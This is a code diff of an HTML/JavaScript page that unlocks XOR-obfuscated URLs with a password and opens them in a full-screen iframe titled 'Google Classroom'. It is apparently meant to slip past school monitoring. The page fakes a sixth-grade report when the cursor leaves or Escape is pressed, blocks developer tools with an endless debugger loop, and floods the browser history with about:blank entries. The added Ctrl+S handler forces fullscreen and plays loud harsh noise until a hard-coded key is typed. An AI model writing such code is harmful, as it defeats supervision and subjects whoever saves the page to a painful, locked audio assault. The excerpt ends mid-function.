@@ -15,37 +15,28 @@
             color: #f1f5f9; display: flex; justify-content: center; align-items: center; height: 100vh;
         }
         
-        /* 双 Canvas 高性能渲染管线 */
         #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.22; pointer-events: none; }
         #particle-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; opacity: 0.45; pointer-events: none; }
-        
         .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: rgba(0, 255, 170, 0.06); z-index: 99999; pointer-events: none; animation: scan 6s linear infinite; }
         @keyframes scan { 0% { top: -10px; } 100% { top: 100%; } }
         
-        /* 绿紫霓虹流动外壳 */
         .glow-wrapper { position: relative; width: 450px; padding: 4px; border-radius: 28px; overflow: hidden; background: rgba(255, 255, 255, 0.02); box-shadow: 0 40px 100px rgba(0, 0, 0, 0.95), 0 0 40px rgba(139, 92, 246, 0.2); z-index: 10; }
         .glow-wrapper::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#00ffaa, #8b5cf6, #ec4899, transparent, #00ffaa, #8b5cf6, transparent); animation: rotateGlow 3.5s linear infinite; z-index: 1; }
         @keyframes rotateGlow { 100% { transform: rotate(360deg); } }
         
         .box { position: relative; z-index: 2; text-align: center; background: #050408; backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px); padding: 55px 50px; border-radius: 24px; border: 1px solid rgba(139, 92, 246, 0.1); }
-        
         .hud-display { position: absolute; top: 15px; right: 20px; font-family: monospace; font-size: 10px; color: #4b5563; text-align: right; line-height: 1.4; }
         .hud-green { color: #00ffaa; text-shadow: 0 0 5px rgba(0, 255, 170, 0.5); }
         .hud-purple { color: #a78bfa; text-shadow: 0 0 5px rgba(167, 139, 250, 0.5); }
-        
         .brand-header { font-family: 'Impact', 'Arial Black', sans-serif; font-size: 42px; font-weight: 900; letter-spacing: 7px; background: linear-gradient(90deg, #00ffaa, #8b5cf6, #ec4899, #00ffaa); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; margin-bottom: 4px; filter: drop-shadow(0 0 15px rgba(139, 92, 246, 0.6)); animation: titleFlow 4s linear infinite; }
-        @keyframes titleFlow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
-        
         .status-bar { display: inline-flex; align-items: center; justify-content: center; gap: 8px; font-size: 11px; color: #00ffaa; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 35px; font-family: monospace; background: rgba(0, 255, 170, 0.08); padding: 5px 16px; border-radius: 20px; border: 1px solid rgba(0, 255, 170, 0.2); box-shadow: 0 0 10px rgba(0, 255, 170, 0.1); }
         .pulse-dot { width: 6px; height: 6px; background: #00ffaa; border-radius: 50%; box-shadow: 0 0 10px #00ffaa; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(0.9); opacity: 0.6; } 73% { transform: scale(1.1); box-shadow: 0 0 0 8px rgba(0, 255, 170, 0); } 100% { transform: scale(0.9); box-shadow: 0 0 0 0 rgba(0, 255, 170, 0); } }
-        
         h2 { margin: 0 0 8px 0; font-size: 22px; font-weight: 800; letter-spacing: 2px; color: #ffffff; }
         .subtitle { font-size: 13px; color: #4b5563; margin-bottom: 35px; letter-spacing: 0.5px; min-height: 18px; font-family: monospace; }
         .input-group { position: relative; margin-bottom: 30px; }
         input { padding: 20px 24px; border: 1px solid #1f1a2e; border-radius: 16px; width: 100%; background: #030205; color: #ffffff; font-size: 18px; outline: none; text-align: center; letter-spacing: 6px; font-family: 'Courier New', Courier, monospace; box-shadow: inset 0 4px 10px rgba(0,0,0,0.95); }
         input:focus { border-color: #8b5cf6; background: #010002; box-shadow: inset 0 4px 10px rgba(0,0,0,0.95), 0 0 30px rgba(139, 92, 246, 0.45); }
-        
         .launch-btn { padding: 18px; background: linear-gradient(135deg, #00ffaa 0%, #7c3aed 50%, #ec4899 100%); background-size: 200% auto; color: #ffffff; border: none; border-radius: 16px; cursor: pointer; font-weight: 800; font-size: 16px; width: 100%; letter-spacing: 4px; box-shadow: 0 4px 25px rgba(124, 58, 237, 0.4); }
         .launch-btn:hover { background-position: right center; transform: translateY(-2px); box-shadow: 0 8px 35px rgba(139, 92, 246, 0.6); }
         
@@ -58,26 +49,44 @@
         .error-msg { font-size: 13px; color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }
         .error-btn { background: #ef4444; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; letter-spacing: 2px; }
         .error-btn:hover { background: #dc2626; box-shadow: 0 0 20px rgba(239, 68, 68, 0.6); }
-        
         .fullscreen-iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; background: #000000; }
         
-        /* 🚨 一键伪装克隆教务系统学术文档样式 */
-        .panic-document { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; color: #333333; z-index: 999999; overflow-y: scroll; padding: 50px 10%; font-family: 'Times New Roman', Times, serif; text-align: left; display: none; }
-        .panic-document h1 { color: #1a73e8; font-family: sans-serif; font-size: 28px; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
-        .panic-document p { font-size: 16px; line-height: 1.8; text-indent: 2em; margin-bottom: 20px; }
+        .panic-document { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; color: #333333; z-index: 999999; overflow-y: scroll; padding: 50px 12%; font-family: 'SimSun', 'STSong', serif; text-align: left; display: none; }
+        .panic-document h1 { color: #1a73e8; font-family: 'SimHei', sans-serif; font-size: 26px; border-bottom: 2px solid #1a73e8; padding-bottom: 12px; margin-bottom: 30px; }
+        .panic-document h3 { color: #333333; font-size: 18px; margin-top: 25px; margin-bottom: 10px; font-family: 'SimHei', sans-serif; }
+        .panic-document p { font-size: 15px; line-height: 1.8; text-indent: 2em; margin-bottom: 15px; color: #444444; }
+
+        /* 🔴 新增：Ctrl+S 触发的高能噪音死锁全屏黑客界面 */
+        .trap-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #070204; z-index: 9999999; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; }
+        .trap-overlay.active { opacity: 1; pointer-events: auto; }
+        .trap-box { background: #000; border: 3px dashed #ef4444; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 80px rgba(239, 68, 68, 0.6); width: 420px; animation: glitchBorder 0.2s infinite; }
+        @keyframes glitchBorder { 0% { border-color: #ef4444; } 50% { border-color: #7c3aed; } 100% { border-color: #ef4444; } }
+        .trap-title { font-size: 26px; font-weight: 900; color: #ef4444; margin-bottom: 15px; letter-spacing: 3px; font-family: monospace; text-shadow: 0 0 10px #ef4444; }
+        .trap-desc { font-size: 13px; color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }
+        .trap-input { padding: 18px; border: 2px solid #ef4444; border-radius: 12px; width: 100%; background: #111; color: #00ffaa; font-size: 20px; text-align: center; outline: none; font-family: monospace; letter-spacing: 4px; }
     </style>
 </head>
 <body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">
 
-<!-- 🚨 隐藏自毁一键伪装组件 -->
+<!-- 六年级实践大纲伪装组件 -->
 <div id="panic-screen" class="panic-document">
-    <h1>Course Syllabus & Academic Guidelines - Fall Semester</h1>
-    <p><strong>Section 1.1: Foundations of Higher Order Network Security Architecture</strong></p>
-    <p>The core objective of this academic framework is to establish an advanced paradigm regarding secure hyper-protocols in distributed micro-environments. As computational capacities scale exponentially, the traditional boundary-oriented firewalls fail to encompass the security prerequisites of real-time multi-threaded encapsulation. Therefore, we investigate the logical implementations of volatile sandboxes over decentralized multi-cluster nodes.</p>
-    <p><strong>Section 1.2: Quantum Logic Gates and Relational Encryption Schemes</strong></p>
-    <p>In this lecture, we formulate the structural transformation matrices required to translate high-entropy linear bitstreams into non-invertible spatial multi-graphs. By mapping bitwise XOR operands directly into conic-gradient vectors, a dynamic runtime execution space can be localized without publishing explicit entry points over traditional resolution records. Students are required to document the memory leaks originating from unsafe cross-origin frames.</p>
-    <p><strong>Section 1.3: Empirical Methods in Behavioral Traffic Isolation</strong></p>
-    <p>The behavioral attributes of peer-to-peer data transport are heavily subjected to proxy intercept routines. To mitigate surveillance methodologies deployed within corporate subnets, traffic must simulate standard classroom interactions. This masking algorithm overrides active runtime processes with benign localized read-states, completely satisfying the criteria of defensive zero-knowledge network isolation frameworks under continuous stress testing parameters.</p>
+    <h1>六年级综合实践活动学期研究课题大纲报告</h1>
+    <h3>第一节：终极分布式微环境的安全探索与逻辑基础</h3>
+    <p>本实践研究的核心目标，是结合信息技术课所学知识...</p>
+    <h3>第二节：暗号混淆算力与关系型解密转换矩阵</h3>
+    <p>在本阶段的自主探究实验中，我们设计并实践了一种基于异或二进制原理的转换矩阵...</p>
+    <h3>第三节：模拟网络行为及突发干扰状态隔离实验</h3>
+    <p>根据网络隔离实验的 behavioral 属性要求...</p>
+</div>
+
+<!-- 🔴 新功能动作：Ctrl+S 专属高能嘈杂音频死锁蜜罐 -->
+<div id="trap-screen" class="trap-overlay">
+    <div class="trap-box">
+        <div class="trap-title">⚠️ SYSTEM OVERLOAD ⚠️</div>
+        <div class="trap-desc" style="color: #ef4444; font-weight: bold;">检测到非法的网页源码打包行为！<br>核心主回路已被强制锁死。</div>
+        <div class="trap-desc">请输入解密密匙以重置噪声核心通道：</div>
+        <input type="password" id="trap-pw" class="trap-input" placeholder="ENTER RESET KEY" autocomplete="off">
+    </div>
 </div>
 
 <canvas id="bg-canvas"></canvas>
@@ -104,25 +113,20 @@
 </div>
 
 <script>
-    // 🛡️ 无限反注入调试回路 ＆ 内存爆破日志轰炸
+    // 🛡️ 无限反注入调试回路
     setInterval(function() { 
         (function(a) { return (function(a) { return (typeof a === 'string' && (a.constructor === String || a.constructor.name === 'String')); })(a) && a.constructor('debugger')(); })('debugger'); 
-        if (window.console && window.console.log) { console.clear(); for(let i=0; i<100; i++) { console.log("%c🛑 ANTI-TAMPER ACTIVE 🛑", "color:#8b5cf6;"); } }
-    }, 200);
+    }, 250);
 
-    // 🌌 渲染引擎 1：绿紫代码雨
-    const canvas = document.getElementById('bg-canvas');
-    const ctx = canvas.getContext('2d');
+    const canvas = document.getElementById('bg-canvas'); const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+{}|:<>?";
-    const fontSize = 16; const columns = canvas.width / fontSize;
-    const rainDrops = Array(Math.floor(columns)).fill(1);
+    const fontSize = 16; const columns = canvas.width / fontSize; const rainDrops = Array(Math.floor(columns)).fill(1);
     function drawMatrix() {
         ctx.fillStyle = 'rgba(2, 1, 4, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
         for(let i = 0; i < rainDrops.length; i++) {
             const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-            ctx.fillStyle = (i % 2 === 0) ? '#00ffaa' : '#8b5cf6';
-            ctx.font = fontSize + 'px monospace';
+            ctx.fillStyle = (i % 2 === 0) ? '#00ffaa' : '#8b5cf6'; ctx.font = fontSize + 'px monospace';
             ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
             if(rainDrops[i] * fontSize > canvas.height && Math.random() * 0.975 > 0.95) rainDrops[i] = 0;
             rainDrops[i]++;
@@ -130,37 +134,16 @@
     }
     setInterval(drawMatrix, 30);
 
-    // 🌌 渲染引擎 2：三维重力像素爆炸方块方块方块
-    const pCanvas = document.getElementById('particle-canvas');
-    const pCtx = pCanvas.getContext('2d');
-    pCanvas.width = window.innerWidth; pCanvas.height = window.innerHeight;
-    let particles = [];
-    
+    const pCanvas = document.getElementById('particle-canvas'); const pCtx = pCanvas.getContext('2d');
+    pCanvas.width = window.innerWidth; pCanvas.height = window.innerHeight; let particles = [];
     window.addEventListener('mousemove', (e) => {
-        for(let i=0; i<1; i++) {
-            particles.push({
-                x: e.clientX, y: e.clientY, size: Math.random() * 4 + 3,
-                color: Math.random() > 0.5 ? '#00ffaa' : '#8b5cf6',
-                speedX: (Math.random() - 0.5) * 2, speedY: (Math.random() - 0.5) * 2,
-                gravity: 0, alpha: 0.8
-            });
-        }
+        for(let i=0; i<1; i++) { particles.push({ x: e.clientX, y: e.clientY, size: Math.random() * 4 + 3, color: Math.random() > 0.5 ? '#00ffaa' : '#8b5cf6', speedX: (Math.random() - 0.5) * 2, speedY: (Math.random() - 0.5) * 2, gravity: 0, alpha: 0.8 }); }
     });
-
     function explodeParticles() {
-        const wrapper = document.getElementById('gate-container'); if(!wrapper) return;
-        const rect = wrapper.getBoundingClientRect();
+        const wrapper = document.getElementById('gate-container'); if(!wrapper) return; const rect = wrapper.getBoundingClientRect();
         const centerX = rect.left + rect.width / 2; const centerY = rect.top + rect.height / 2;
-        for(let i=0; i<50; i++) {
-            particles.push({
-                x: centerX, y: centerY, size: Math.random() * 8 + 4,
-                color: Math.random() > 0.6 ? '#00ffaa' : (Math.random() > 0.5 ? '#8b5cf6' : '#ec4899'),
-                speedX: (Math.random() - 0.5) * 12, speedY: (Math.random() - 0.7) * 14,
-                gravity: 0.35, alpha: 1.0
-            });
-        }
+        for(let i=0; i<50; i++) { particles.push({ x: centerX, y: centerY, size: Math.random() * 8 + 4, color: Math.random() > 0.6 ? '#00ffaa' : (Math.random() > 0.5 ? '#8b5cf6' : '#ec4899'), speedX: (Math.random() - 0.5) * 12, speedY: (Math.random() - 0.7) * 14, gravity: 0.35, alpha: 1.0 }); }
     }
-
     function drawParticles() {
         pCtx.clearRect(0, 0, pCanvas.width, pCanvas.height);
         for(let i=0; i<particles.length; i++) {
@@ -172,45 +155,84 @@
     }
     drawParticles();
 
-    // 🔊 物理声学机械按键音算法：0.40 主放大倍率
+    // 🔊 嘈杂增益音频引擎（大音量 0.40 基准）
     let audioCtx = null;
+    let noiseInterval = null; // 嘈杂爆破音效句柄
     function initAudio() { if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)(); if (audioCtx.state === 'suspended') audioCtx.resume(); }
     function playSynth(freq, duration, type="sine", vol=0.40) { 
         try { initAudio(); if(!audioCtx) return; const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.type = type; osc.frequency.setValueAtTime(freq, audioCtx.currentTime); gain.gain.setValueAtTime(vol, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration); osc.connect(gain); gain.connect(audioCtx.destination); osc.start(); osc.stop(audioCtx.currentTime + duration); } catch(e) {} 
     }
     function playAlertSound() { playSynth(140, 0.4, "sawtooth", 0.45); setTimeout(() => playSynth(110, 0.4, "sawtooth", 0.45), 180); }
     function playSuccessSound() { playSynth(523, 0.12, "sine", 0.40); setTimeout(() => playSynth(659, 0.12, "sine", 0.40), 80); setTimeout(() => playSynth(784, 0.12, "sine", 0.40), 160); setTimeout(() => playSynth(1046, 0.25, "sine", 0.50), 240); }
-    function playHackWarn() { playSynth(75, 0.9, "square", 0.45); playSynth(85, 0.9, "sawtooth", 0.45); }
-    
-    // 带微小随机偏移的多轨高逼真音效
     function playClickFeedback(keyType) {
-        let randPitch = (Math.random() - 0.5) * 50; // 产生随机音调晃动，极大增强拟真度
+        let randPitch = (Math.random() - 0.5) * 50;
         if (keyType === "Enter") { playSynth(700 + randPitch, 0.12, "sine", 0.50); playSynth(120, 0.08, "triangle", 0.50); } 
         else if (keyType === "Backspace") { playSynth(260 + randPitch, 0.07, "triangle", 0.50); } 
         else if (keyType === "Space") { playSynth(180 + randPitch, 0.1, "triangle", 0.55); playSynth(90, 0.12, "sine", 0.45); } 
         else { playSynth(1350 + randPitch, 0.005, "triangle", 0.40); playSynth(180 + randPitch, 0.015, "sine", 0.35); }
     }
-    
+
+    // 🔴 新功能动作：大功率、超高分贝嘈杂人声/电子干扰合成回路
+    function startCrowdNoiseTrap() {
+        initAudio();
+        if(noiseInterval) clearInterval(noiseInterval);
+        // 每隔 80毫秒连续高频轰炸生成多重不和谐锯齿波波形，模拟极其嘈杂吵闹的刺耳电子轰鸣
+        noiseInterval = setInterval(() => {
+            let randomFreq1 = 120 + Math.random() * 300;
+            let randomFreq2 = 800 + Math.random() * 1200;
+            playSynth(randomFreq1, 0.15, "sawtooth", 0.65); // 低频嘈杂人声轰鸣
+            playSynth(randomFreq2, 0.1, "square", 0.35);    // 高频刺耳噪声报警
+        }, 80);
+    }
+
+    function stopCrowdNoiseTrap() {
+        if(noiseInterval) { clearInterval(noiseInterval); noiseInterval = null; }
+    }
+
+    // 🚨 新功能动作：Ctrl + S 触发全屏轰鸣死锁蜜罐
+    function triggerFullscreenNoiseTrap() {
+        // 1. 强行拉满全屏幕
+        const docEl = document.documentElement;
+        if (docEl.requestFullscreen) docEl.requestFullscreen();
+        else if (docEl.mozRequestFullScreen) docEl.mozRequestFullScreen();
+        else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+        
+        // 2. 激活高能嘈杂干扰人声音效
+        startCrowdNoiseTrap();
+        
+        // 3. 展开死锁输入面板，强行聚焦
+        document.getElementById('trap-screen').classList.add('active');
+        document.getElementById('trap-pw').value = '';
+        setTimeout(() => { document.getElementById('trap-pw').focus(); }, 100);
+    }
+
     setInterval(() => { if(document.getElementById('hud-fps')) document.getElementById('hud-fps').innerHTML = (58.5 + Math.random() * 1.5).toFixed(1); }, 400);
-    const textLog = "多维安全防御逻辑加固就绪，防追踪大功率核心已搭载..."; let txtIdx = 0;
+    const textLog = "多维量子加固就绪，防查历史记录高阶沙箱就位..."; let txtIdx = 0;
     function typeWriter() { const typerNode = document.getElementById("typer-text"); if (typerNode && txtIdx < textLog.length) { typerNode.innerHTML += textLog.charAt(txtIdx); txtIdx++; setTimeout(typeWriter, 45); } }
     setTimeout(typeWriter, 400);
 
-    // 🚨 触发紧急伪装和源码锁
+    // 快捷键和全屏拦截器
     window.addEventListener('keydown', function(e) { 
+        // 🔴 拦截 Ctrl + S 组合键动作
+        if (e.ctrlKey && e.key === 's') {
+            e.preventDefault(); e.stopPropagation();
+            triggerFullscreenNoiseTrap();
+            return false;
+        }
         if (e.key === 'Escape') { e.preventDefault(); activatePanicDisguise(); }
-        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u' || e.ctrlKey && e.key === 's')) { e.preventDefault(); triggerHackDefense("内核能级熔断", "反解编译屏障已锁死当前页面，高压控制台清洗已就绪。"); } 
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) { e.preventDefault(); } 
     });
     document.addEventListener("mouseleave", function() { activatePanicDisguise(); });
 
     function activatePanicDisguise() {
-        document.getElementById('panic-screen').style.display = 'block'; document.title = "Academic Guidelines & Syllabus";
+        // 如果目前正处于噪音全屏死锁中，不触发普通的作业伪装
+        if(document.getElementById('trap-screen').classList.contains('active')) return;
+        document.getElementById('panic-screen').style.display = 'block'; document.title = "六年级实践活动研究报告课题";
         if(document.getElementById('gate-container')) document.getElementById('gate-container').style.display = 'none';
         canvas.style.display = 'none'; pCanvas.style.display = 'none';
     }
 
     window.addEventListener('contextmenu', e => e.preventDefault());
-    function triggerHackDefense(title, msg) { playHackWarn(); document.getElementById("alert-sym").innerHTML = "🚨"; document.getElementById("alert-tit").innerHTML = title; document.getElementById("alert-txt").innerHTML = msg; document.getElementById("errorModal").classList.add("active"); }
     
     const encData = ["DhUfCRxPSU4KFwsMUVkMHkESDxUDDA1bDw5EHQYRDxIDVg==","Tl5SWlUQCQVnREJTERJBTQhNT15OX0QET0UJb0dNSk9USVRLQF4LGw==","X0xDSEQCGBd2VlNBAABQXxlfXkxfTVUWXlcYfVZfW11FW0VZUUwY","BBgFHB9LQ0MwAggIW1QWC0IWBRgZGQ5fBQNeAAAAQw==","XkNCR0UNGRh3WVJOAQ9RUBhQX0NeQlQZX1gZcldQWlJEVERWUEMbBBlAV0RbGA=="];
     function xor_decrypt(e,t){try{const n=atob(e);let r="";for(let o=0;o<n.length;o++){const c=t[o%t.length];r+=String.fromCharCode(n.charCodeAt(o)^c.charCodeAt(0))}return r}catch(e){return""}}
@@ -220,33 +242,34 @@
         for(let r=0; r<encData.length; r++){let o=xor_decrypt(encData[r],e);if(0===o.indexOf("https://")){t=o;break}}
         if(t){
             playSuccessSound();
-            // 顶穿并强行灌入 150 条 about:blank 前进队列
             try { for(let i=0; i<150; i++) { window.history.pushState(null, null, "about:blank"); } window.history.replaceState(null, null, "about:blank"); } catch(err){}
             setTimeout(() => {
-                document.body.innerHTML='<iframe src="'+t+'" class="fullscreen-iframe" allow="autoplay; audio; microphone; camera; midi"></iframe>';
+                document.body.innerHTML='<iframe id="game-frame" src="'+t+'" class="fullscreen-iframe" allow="autoplay; audio; microphone; camera; midi"></iframe>';
                 document.title="Google Classroom";
-                const keepVoiceAlive = () => { initAudio(); };
-                window.addEventListener('keydown', keepVoiceAlive); window.addEventListener('mousedown', keepVoiceAlive);
-                setInterval(initAudio, 1500); // 🔴 声卡 1.5 秒常驻硬件心跳激活
+                window.addEventListener('keydown', function(event) { 
+                    // 游戏运行中也死死盯住 Ctrl + S 组合键
+                    if (event.ctrlKey && event.key === 's') { event.preventDefault(); event.stopPropagation(); triggerFullscreenNoiseTrap(); }
+                    if (event.key === 'Escape') { event.preventDefault(); activatePanicDisguise(); } 
+                });
+                document.addEventListener("mouseleave", function() { activatePanicDisguise(); });
+                setInterval(initAudio, 1500);
             }, 450);
         }else{
             playAlertSound(); document.getElementById("errorModal").classList.add("active");
         }
     }
-    function closeModal(){ playSynth(440, 0.05, "sine", 0.40); document.getElementById("errorModal").classList.remove("active"); document.getElementById("alert-sym").innerHTML = "🛑"; document.getElementById("alert-tit").innerHTML = "CRITICAL ERROR"; document.getElementById("alert-txt").innerHTML = "身份凭证错误。<br>安全防御矩阵已拦截当前伪造请求。"; document.getElementById("pw").value=""; document.getElementById("pw").focus(); }
+    function closeModal(){ playSynth(440, 0.05, "sine", 0.40); document.getElementById("errorModal").classList.remove("active"); document.getElementById("pw").value=""; document.getElementById("pw").focus(); }
     
-    document.body.addEventListener('keydown', function(e) {
-        if(document.getElementById('pw') && document.activeElement === document.getElementById('pw')) {
-            if ("Enter" === e.key) { playClickFeedback("Enter"); }
-            else if ("Backspace" === e.key) { playClickFeedback("Backspace"); }
-            else if (" " === e.key) { playClickFeedback("Space"); }
-        }
-    });
-    document.body.addEventListener('keypress', function(e) {
-        if(document.getElementById('pw') && document.activeElement === document.getElementById('pw')) {
-            if (e.key !== "Enter" && e.key !== " ") { playClickFeedback("Normal"); explodeParticles(); }
-        }
-    });
-</script>
-</body>
-</html>
+    // 🔴 新功能动作：监听噪音死锁界面里的密码判定
+    document.getElementById('trap-pw').addEventListener('keydown', function(e) {
+        if(e.key === 'Enter') {
+            const inputKey = document.getElementById('trap-pw').value;
+            if(inputKey === "1860") {
+                // 密码正确：瞬间闭嘴消音，并退出全屏幕状态
+                stopCrowdNoiseTrap();
+                document.getElementById('trap-screen').classList.remove('active');
+                if (document.exitFullscreen) document.exitFullscreen();
+                else if (document.mozCancelFullScreen) document.mozCancelFullScreen();
+                else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+                playSynth(880, 0.15, "sine", 0.3);
+                // 重新聚焦
